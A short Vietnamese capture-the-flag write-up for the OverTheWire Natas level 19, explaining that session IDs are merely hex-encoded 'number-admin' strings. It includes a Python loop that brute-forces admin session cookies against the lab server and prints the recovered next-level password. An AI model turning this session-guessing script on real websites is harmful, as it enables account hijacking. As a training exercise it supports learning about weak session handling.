# Natas 19 → 20

## Mục tiêu

Lấy password của `natas20` khi session ID không còn tuần tự.

## Tôi thấy

Source tạo session ID từ chuỗi `<số>-<username>`, sau đó mã hóa bằng `bin2hex()`. Hàm kiểm tra giải mã ID và yêu cầu chuỗi có dạng `số-username`.

## Cách làm

```python
import binascii
import requests

for number in range(1, 641):
    sid = binascii.hexlify(f'{number}-admin'.encode()).decode()
    r = requests.get(
        'http://natas19.natas.labs.overthewire.org/',
        auth=('natas19', '<password>'),
        cookies={'PHPSESSID': sid},
    )
    if 'You are an admin' in r.text:
        print(sid, r.text)
```

ID đúng là `3238312d61646d696e`, tương ứng `281-admin`.

## Vì sao cách này hiệu quả

Session ID chỉ được làm rối bằng hex, không phải giá trị ngẫu nhiên không thể dự đoán. Tạo đúng chuỗi trước khi hex-encode giúp truy cập session admin tương ứng.

## Kết quả

Password của `natas20`:

```text
slOKYGsjlJhaqKliGvrgWAzln0JyrWao
```

